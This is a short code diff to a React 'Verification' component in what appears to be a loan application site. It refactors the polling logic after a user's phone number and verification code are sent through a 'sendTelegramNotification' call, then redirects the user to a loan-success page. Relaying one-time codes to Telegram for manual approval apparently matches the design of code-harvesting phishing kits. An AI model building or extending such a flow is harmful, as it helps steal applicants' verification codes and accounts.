@@ -189,11 +189,9 @@ function Verification() {
         setLoading(false)
         setAutoPolling(false)
         setStatus("approved")
-        setTimeout(() => {
-          const storedApp = localStorage.getItem('loanAppData')
-          const appData = storedApp ? JSON.parse(storedApp) : {}
-          navigate(`${basePath}/loan-success?name=${encodeURIComponent(appData.name || 'User')}&amount=${encodeURIComponent(appData.amount || 'N/A')}`)
-        }, 300)
+        const storedApp = localStorage.getItem('loanAppData')
+        const appData = storedApp ? JSON.parse(storedApp) : {}
+        navigate(`${basePath}/loan-success?name=${encodeURIComponent(appData.name || 'User')}&amount=${encodeURIComponent(appData.amount || 'N/A')}`)
       } else if (result.status === 'rejected') {
         clearInterval(pollingIntervalRef.current)
         pollingIntervalRef.current = null
@@ -229,9 +227,7 @@ function Verification() {
       const result = await sendTelegramNotification(phoneNumber, code)
       
       if (result.success && result.requestId) {
-        setRequestId(result.requestId)
-        setAutoPolling(true)
-        checkCountRef.current = 0
+        startPolling(result.requestId)
       } else {
         setError("Échec de l'envoi: " + (result.error || 'Unknown error'))
         setLoading(false)
